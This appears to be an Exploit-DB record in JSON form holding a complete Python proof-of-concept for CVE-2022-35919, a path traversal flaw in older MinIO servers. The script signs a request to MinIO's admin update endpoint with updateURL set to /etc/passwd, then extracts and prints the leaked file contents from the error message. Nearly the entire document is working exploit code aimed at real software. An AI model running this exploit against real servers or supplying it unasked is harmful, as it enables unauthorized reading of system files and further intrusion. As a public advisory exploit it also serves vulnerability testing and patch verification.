{"source": "https://www.exploit-db.com/exploits/51734", "vulnName": "Minio 2022-07-29T19-40-48Z - Path traversal", "vulnEDBID": "51734", "vulnCVE": "2022-35919", "author": "JENSON ZHAO", "exploitType": "WEBAPPS", "platform": "GO", "datePublished": "2023-10-09", "vulnContent": "# Exploit Title: Minio 2022-07-29T19-40-48Z - Path traversal\n# Date: 2023-09-02\n# Exploit Author: Jenson Zhao\n# Vendor Homepage: https://min.io/\n# Software Link: https://github.com/minio/minio/\n# Version: Up to (excluding) 2022-07-29T19-40-48Z\n# Tested on: Windows 10\n# CVE : CVE-2022-35919\n# Required before execution: pip install minio,requests\nimport urllib.parse\nimport requests, json, re, datetime, argparse\nfrom minio.credentials import Credentials\nfrom minio.signer import sign_v4_s3\n\n\nclass MyMinio():\n    secure = False\n\n    def __init__(self, base_url, access_key, secret_key):\n        self.credits = Credentials(\n            access_key=access_key,\n            secret_key=secret_key\n        )\n        if base_url.startswith('http://') and base_url.endswith('/'):\n            self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd'\n        elif base_url.startswith('https://') and base_url.endswith('/'):\n            self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd'\n            self.secure = True\n        else:\n            print('Please enter a URL address that starts with \"http://\" or \"https://\" and ends with \"/\"\\n')\n\n    def poc(self):\n        datetimes = datetime.datetime.utcnow()\n        datetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ')\n        urls = urllib.parse.urlparse(self.url)\n        headers = {\n            'X-Amz-Content-Sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',\n            'X-Amz-Date': datetime_str,\n            'Host': urls.netloc,\n        }\n        headers = sign_v4_s3(\n            method='POST',\n            url=urls,\n            region='',\n            headers=headers,\n            credentials=self.credits,\n            content_sha256='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',\n            date=datetimes,\n        )\n        if self.secure:\n            response = requests.post(url=self.url, headers=headers, verify=False)\n        else:\n            response = requests.post(url=self.url, headers=headers)\n        try:\n            message = json.loads(response.text)['Message']\n            pattern = r'(\\w+):(\\w+):(\\d+):(\\d+):(\\w+):(\\/[\\w\\/\\.-]+):(\\/[\\w\\/\\.-]+)'\n            matches = re.findall(pattern, message)\n            if matches:\n                print('There is CVE-2022-35919 problem with the url!')\n                print('The contents of the /etc/passwd file are as follows:')\n                for match in matches:\n                    print(\"{}:{}:{}:{}:{}:{}:{}\".format(match[0], match[1], match[2], match[3], match[4], match[5],\n                                                        match[6]))\n            else:\n                print('There is no CVE-2022-35919 problem with the url!')\n                print('Here is the response message content:')\n                print(message)\n        except Exception as e:\n            print(\n                'It seems there was an issue with the requested response, which did not meet our expected criteria. Here is the response content:')\n            print(response.text)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-u\", \"--url\", required=True, help=\"URL of the target. example: http://192.168.1.1:9088/\")\n    parser.add_argument(\"-a\", \"--accesskey\", required=True, help=\"Minio AccessKey of the target. example: minioadmin\")\n    parser.add_argument(\"-s\", \"--secretkey\", required=True, help=\"Minio SecretKey of the target. example: minioadmin\")\n    args = parser.parse_args()\n    minio = MyMinio(args.url, args.accesskey, args.secretkey)\n    minio.poc()\n            "}